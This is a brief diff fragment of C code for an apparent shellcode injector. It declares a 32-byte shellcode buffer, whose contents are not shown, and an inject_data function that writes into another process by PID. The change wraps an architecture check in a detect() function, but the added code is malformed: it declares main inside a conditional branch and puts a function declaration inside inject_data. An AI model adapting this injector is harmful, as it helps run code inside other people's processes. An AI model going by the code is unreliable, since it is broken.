@@ -17,11 +17,18 @@
 #define QUOTE_MACRO_VALUE(MACRO) #MACRO
 #define print_definition(MACRO) printf("%-24s = %s\n", #MACRO, QUOTE_MACRO_VALUE(MACRO))
 #define print_undefined(MACRO)  printf("%-24s = n/a\n", #MACRO)
-#ifdef __amd64               
+void detect() //dtects the arc in runtime 
+{
+ #ifdef __amd64               
     print_definition(__amd64); //def for x86 needs to be done for intel
 #else
     print_undefined(__amd64);
-#endif 
+    int main(); 
+#endif
+
+}
+ 
+
 ///if not detected program ends soo exit pogram 
 
 #define SHELLCODE_SIZE 32
@@ -37,7 +44,7 @@ unsigned char *shellcode =
 int inject_data (pid_t pid, unsigned char *src, void *dst, int len)
 {
 
-
+void detect(); 
 
 
 
